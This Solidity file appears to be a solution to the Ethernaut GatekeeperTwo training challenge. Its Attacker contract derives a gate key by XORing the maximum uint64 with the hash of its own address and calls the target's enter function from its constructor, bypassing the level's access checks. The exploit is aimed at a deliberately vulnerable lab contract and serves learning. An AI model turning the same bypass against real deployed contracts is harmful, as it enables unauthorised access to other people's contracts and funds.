// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {GatekeeperTwo} from "ethernaut/levels/GatekeeperTwo.sol";

contract Attacker {
    address owner;

    constructor(GatekeeperTwo target) {
        // gets past the third gate, the hash of address will be canceled due to XOR
        bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        target.enter(key);
    }
}
